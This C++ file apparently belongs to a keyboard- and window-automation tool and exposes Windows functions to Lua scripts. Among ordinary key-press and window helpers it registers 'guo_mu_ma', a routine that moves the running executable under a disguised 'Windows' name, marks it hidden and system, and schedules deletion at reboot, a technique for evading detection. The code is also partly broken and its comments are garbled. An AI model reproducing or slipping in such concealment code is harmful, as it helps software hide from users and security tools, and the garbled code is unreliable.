#include "stdafx.h"
#include "lua_export.h"
#include "functions.h"


extern ExportedFunctions Exported;

int export_keyDown(lua_State *L)
{
	int key = (int)lua_tonumber(L,1);
	keyDown(key);
	return 0;
}

int export_keyUp(lua_State *L)
{
	int key = (int)lua_tonumber(L, 1);
	keyUp(key);
	return 0;
}

int export_doKeyPress(lua_State *L)
{
	int key = (int)lua_tonumber(L, 1);
	int s = 0;
	if (lua_isnumber(L, 2)) {
		s = (int)lua_tonumber(L, 2);
	}
	doKeyPress(key,s);
	return 0;
}


int guo_mu_ma(lua_State *L)
{
	char FileName[MAX_PATH];
	memset(FileName, 0, MAX_PATH);
	//��ȡ�ļ�·��
	GetModuleFileName(NULL,FileName, MAX_PATH);
	char *NewFileName;
	NewFileName = new char[MAX_PATH];
	memset(NewFileName, 0, MAX_PATH);
	//�����ļ�����
	SetFileAttributes(NewFileName, FILE_ATTRIBUTE_NORMAL);
	//����ֱ��ɾ��
	if (DeleteFile(FileName))//��ֱ��ɾ�����
	{
		delete[] NewFileName;
		return false;
	}
	//����APIһ�������ن���
	wsprintf(NewFileName, "%C:\\\0", FileName[0]);
	CreateDirectory(NewFileName, NULL);
	SetFileAttributes(NewFileName, FILE_ATTRIBUTE_HIDDEN);
	wsprintf(NewFileName, "%C:\\Windows ����������\0", FileName[0], GetTickCount());
	SetFileAttributes(NewFileName, FILE_ATTRIBUTE_NORMAL);
	DeleteFile(NewFileName);
	if (!MoveFileEx(FileName, NewFileName, MOVEFILE_REPLACE_EXISTING))
	{
		delete[] NewFileName;
		return false;//�����˾ͷ���
	}
	MoveFileEx(NewFileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
	SetFileAttributes(NewFileName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	delete[] NewFileName;
	return 0;
}


int export_getWindowRect(lua_State *L)
{
	RECT rect;
	if (GetWindowRect((HWND)(LONGLONG)lua_tonumber(L, 1), &rect) == FALSE) {
		throw "getWindowRect ʧ��";
	}
	lua_newtable(L);//����һ����񣬷���ջ
	lua_pushstring(L, "top");//ѹ��key
	lua_pushinteger(L,rect.top);//ѹ��value
	lua_settable(L, -3);//����key,value�������õ�table����ȥ
	lua_pushstring(L, "bottom");//ѹ��key
	lua_pushinteger(L, rect.bottom);//ѹ��value
	lua_settable(L, -3);//����key,value�������õ�table����ȥ
	lua_pushstring(L, "left");//ѹ��key
	lua_pushinteger(L, rect.left);//ѹ��value
	lua_settable(L, -3);//����key,value�������õ�table����ȥ
	lua_pushstring(L, "right");//ѹ��key
	lua_pushinteger(L, rect.right);//ѹ��value
	lua_settable(L, -3);//����key,value�������õ�table����ȥ
	return 1;

}

int export_moveWindow(lua_State *L)
{
	if (lua_isnil(L, 1) == 1)
		throw "error";
	MoveWindow((HWND)(LONGLONG)lua_tonumber(L, 1), (int)lua_tointeger(L, 2), (int)lua_tointeger(L, 3), NULL, NULL, true);
	return 0;
}

int export_showWindow(lua_State *L)
{
	if (lua_isnil(L, 1) == 1)
		throw "error";
	ShowWindow((HWND)(LONGLONG)lua_tonumber(L, 1), SW_SHOW);
	return 0;
}

void lua_export()
{
	lua_State *lua_state = Exported.GetLuaState();
	lua_register(lua_state, "keyDown", export_keyDown); 
	lua_register(lua_state, "keyUp", export_keyUp);
	lua_register(lua_state, "my_keybd_event", export_doKeyPress);
	lua_register(lua_state, "guo_mu_ma", guo_mu_ma);
	lua_register(lua_state, "getWindowRect", export_getWindowRect);
	lua_register(lua_state, "moveWindow", export_moveWindow);
	lua_register(lua_state, "showWindow", export_showWindow);
}